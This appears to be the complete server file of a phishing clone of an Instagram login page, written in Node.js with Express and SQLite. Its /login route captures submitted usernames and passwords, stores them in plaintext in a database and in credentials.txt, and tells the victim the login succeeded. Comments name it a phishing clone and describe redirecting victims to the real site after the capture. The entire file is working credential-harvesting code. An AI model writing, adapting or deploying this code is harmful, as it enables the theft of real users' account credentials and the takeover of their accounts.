const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

const fs = require('fs');

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Database Setup
const db = new sqlite3.Database('database.db', (err) => {
    if (err) {
        console.error('Error opening database:', err);
    } else {
        console.log('Connected to the SQLite database.');
        db.run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);
    }
});

// Routes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Simple validation
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing credentials' });
    }

    const stmt = db.prepare("INSERT INTO users (username, password) VALUES (?, ?)");
    stmt.run(username, password, function (err) {
        if (err) {
            console.error('Error inserting data:', err);
            return res.status(500).json({ success: false, message: 'Database error' });
        }
        console.log(`User logged in: ${username}`);

        // Save to text file
        const logEntry = `${username} -- ${password}\n`;
        fs.appendFile('credentials.txt', logEntry, (err) => {
            if (err) {
                console.error('Error writing to file:', err);
            }
        });
        // Redirect to actual Instagram or show a success message? 
        // Usually phishing clones redirect to the real site after capturing creds.
        // For this demo, we'll just return success.
        res.json({ success: true, message: 'Login successful' });
    });
    stmt.finalize();
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
